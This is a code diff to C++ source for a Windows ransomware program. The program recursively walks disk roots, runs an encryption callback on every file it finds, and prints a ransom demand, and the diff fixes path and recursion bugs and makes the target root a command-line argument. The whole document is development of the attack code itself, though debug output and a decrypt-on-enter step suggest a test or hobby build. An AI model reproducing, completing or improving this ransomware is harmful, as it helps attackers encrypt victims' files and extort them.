@@ -8,6 +8,7 @@
 
 #define DEBUG
 #define MULTI_THREADING 0
+#define RECURSIVE false
 
 #if MULTI_THREADNG == 1
 #include <thread>
@@ -20,10 +21,12 @@ class Helpers
 public:
     static string formatPath(char x, string rootPath)
     {
-        return rootPath.substr(0, rootPath.find_first_of("\\") + 1) + x;
+        return rootPath.substr(0, rootPath.find_last_of("\\") + 1) + x;
     }
-    static char fileAttrFilter(DWORD attr)
+    static char fileAttrFilter(DWORD attr, WIN32_FIND_DATAA fData)
     {
+        if (strcmp(fData.cFileName, ".") == 0 || strcmp(fData.cFileName, "..") == 0)
+            return 'N';
 
         if ((FILE_ATTRIBUTE_DIRECTORY & attr) != 0x0)
         {
@@ -98,7 +101,7 @@ public:
 
         return disks;
     }
-    static void scanDisksRecursive(std::vector<string> roots, void (*callback)(string))
+    static void scanDisksRecursive(const std::vector<string> &roots, void (*callback)(string))
     {
         size_t len = roots.size();
         for (size_t i = 0; i < len; i++)
@@ -130,7 +133,8 @@ public:
 #endif
         do
         {
-            if (Helpers::fileAttrFilter(fData.dwFileAttributes) == 'D')
+#if RECURSIVE
+            if (Helpers::fileAttrFilter(fData.dwFileAttributes, fData) == 'D')
             {
                 string sub_root = root.substr(0, root.find_last_of("\\") + 1) + fData.cFileName + "\\";
 #ifdef DEBUG
@@ -142,14 +146,17 @@ public:
                 Scanners::scanRootRecursive(sub_root, callback);
 #endif
             }
-            else if (Helpers::fileAttrFilter(fData.dwFileAttributes) == 'F')
+
+#else
+            if (Helpers::fileAttrFilter(fData.dwFileAttributes, fData) == 'F')
             {
-                string file = root.substr(0, root.find_first_of("\\") + 1) + fData.cFileName;
+                string file = root.substr(0, root.find_last_of("\\") + 1) + fData.cFileName;
 #ifdef DEBUG
                 cout << "executing callback() on " << file << endl;
 #endif
                 callback(file);
             }
+#endif
 
         } while (FindNextFileA(searchHandle, &fData));
         FindClose(searchHandle);
@@ -189,8 +196,8 @@ public:
         }
         else
         {
-            this->scope = root;
-            Scanners::scanRootRecursive(root, Crypto::encrypt);
+            this->scope = root + "\\";
+            Scanners::scanRootRecursive(this->scope, Crypto::encrypt);
         }
         return 0;
     }
@@ -202,9 +209,10 @@ public:
 int main(int argc, char **argv)
 {
     cout << "running!" << endl;
+    cout << "Arg: " << argv[1] << endl;
     Ransom r = Ransom();
-    r.activate();
-    cout << "EVERYTHING HAS BEEN ENCRYPTED! PAY RANSOMWARE TO DECRYPT!(or press enter)" << endl;
+    r.activate(string(argv[1]));
+    cout << "EVERYTHING HAS BEEN ENCRYPTED! PAY RANSOM TO DECRYPT!(or press enter)" << endl;
     int x = 0;
     cin >> x;
     r.deactivate();
